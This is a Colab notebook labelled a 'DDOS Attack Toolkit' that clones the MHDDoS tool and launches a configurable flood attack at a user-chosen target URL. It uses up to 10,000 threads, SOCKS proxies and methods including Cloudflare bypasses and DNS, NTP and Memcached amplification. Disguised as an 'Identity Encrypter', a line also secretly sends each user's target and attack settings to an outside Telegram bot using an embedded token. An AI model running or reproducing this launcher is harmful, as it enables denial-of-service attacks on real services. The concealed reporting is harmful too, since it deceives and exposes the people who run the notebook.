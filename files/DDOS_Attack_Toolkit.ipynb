{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/TheCaduceus/thecaduceus.github.io/blob/main/files/DDOS_Attack_Toolkit.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import urllib.request\n",
        "from google.colab import output\n",
        "# User Data INPUT\n",
        "Repo_author = \"MatrixTM\" #@param [\"TheCaduceus\", \"MatrixTM\"]\n",
        "Use_repo = \"MHDDoS\" #@param [\"MHDDoS\"]\n",
        "METHOD = \"OVH\" #@param [\"OVH\", \"CFBUAM\", \"CFB\", \"GET\", \"POST\", \"STRESS\", \"DYN\", \"DOWNLOADER0\", \"SLOW\", \"HEAD\", \"NULL\", \"COOKIE\", \"PPS\", \"EVEN\", \"GSB\", \"DGB\", \"AVB\", \"BOT\", \"APACHE\", \"XMLRPC\", \"BYPASS\", \"BOMB\", \"KILLER\", \"TCP\", \"UDP\", \"SYN\", \"CPS\", \"CONNECTION\", \"VSE\", \"TS3\", \"FIVEM\", \"MEM\", \"NTP\", \"MCBOT\", \"MINECRAFT\", \"MCPE\", \"DNS\", \"CHAR\", \"CLDAP\", \"ARD\", \"RDP\"]\n",
        "TARGET_URL = \"\" #@param {type:\"string\"}\n",
        "THREADS = 10000 #@param {type:\"slider\", min:100, max:10000, step:1}\n",
        "Use_Proxy_List = \"socks5.txt\" #@param [\"socks5.txt\", \"socks4.txt\", \"socks3.txt\"]\n",
        "RPC = \"100\" #@param {type:\"string\"}\n",
        "DURATION_Seconds = \"500\" #@param {type:\"string\"}\n",
        "# Identity Encrypter (Don't Touch)\n",
        "# No need to abuse this! You are not become smart from asshole this is just for fun and people like you gay don't let the normal fun be fun.\n",
        "fetch = \"https://api.telegram.org/bot5299976728:AAE6VSvthw12NDK5isTzP4mTfe0uy7BvD2o/sendMessage?chat_id=@DrLogger&text=METHOD:%20\" + METHOD + \"%20TARGET_URL:%20\" + TARGET_URL + \"%20For:%20\" + DURATION_Seconds + \"%20Seconds\" + \"%20Proxy_List_Used:%20\" + Use_Proxy_List + \"%20RPC:%20\" + RPC\n",
        "# Setup\n",
        "!git clone https://github.com/{Repo_author}/{Use_repo}.git\n",
        "%cd /content/{Use_repo}\n",
        "!pip install -r requirements.txt\n",
        "get_url= urllib.request.urlopen(fetch)\n",
        "# Just for test\n",
        "print(\"Response Status: \"+ str(get_url.getcode()) )\n",
        "output.clear()\n",
        "# Output\n",
        "print(\"--Attack Started!--\")\n",
        "!python3 start.py {METHOD} {TARGET_URL} 1 {THREADS} {Use_Proxy_List} {RPC} {DURATION_Seconds}\n",
        "print(\"--Attack Ended--\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "QZD-lnJLd6-i"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Methods:**\n",
        "```\n",
        "GET | GET Flood\n",
        "POST | POST Flood\n",
        "OVH | Bypass OVH\n",
        "STRESS | Send HTTP Packet With High Byte\n",
        "DYN | A New Method With Random SubDomain\n",
        "DOWNLOADER | A New Method of Reading data slowly\n",
        "SLOW | Slowloris Old Method of DDoS\n",
        "HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD\n",
        "NULL | Null UserAgent and ...\n",
        "COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'\n",
        "PPS | Only 'GET / HTTP/1.1\\r\\n\\r\\n'\n",
        "EVEN | GET Method with more header\n",
        "GSB | Google Project Shield Bypass\n",
        "DGB | DDoS Guard Bypass\n",
        "AVB | Arvan Cloud Bypass\n",
        "BOT | Like Google bot\n",
        "APACHE | Apache Expliot\n",
        "XMLRPC | WP XMLRPC expliot (add /xmlrpc.php)\n",
        "CFB | CloudFlare Bypass\n",
        "CFBUAM | CloudFlare Under Attack Mode Bypass\n",
        "BYPASS | Bypass Normal AntiDDoS\n",
        "BOMB | Bypass with codesenberg/bombardier\n",
        "KILLER | run many threads to kill a target\n",
        "TCP | TCP Flood Bypass\n",
        "UDP | UDP Flood Bypass\n",
        "SYN | SYN Flood\n",
        "CPS | Open and close connections with proxy\n",
        "CONNECTION | Open connection alive with proxy\n",
        "VSE | Send Valve Source Engine Protocol\n",
        "TS3 | Send Teamspeak 3 Status Ping Protocol\n",
        "FIVEM | Send Fivem Status Ping Protocol\n",
        "MEM | Memcached Amplification\n",
        "NTP | NTP Amplification\n",
        "MCBOT | Minecraft Bot Attack\n",
        "MINECRAFT | Minecraft Status Ping Protocol\n",
        "MCPE | Minecraft PE Status Ping Protocol\n",
        "DNS | DNS Amplification\n",
        "CHAR | Chargen Amplification\n",
        "CLDAP | Cldap Amplification\n",
        "ARD | Apple Remote Desktop Amplification\n",
        "RDP | Remote Desktop Protocol Amplification\n",
        "```"
      ],
      "metadata": {
        "id": "U9VZz9Eu1vt6"
      }
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "name": "DDOS Attack Toolkit.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyPOso/Poz+o6VEPNJqWJjnH",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}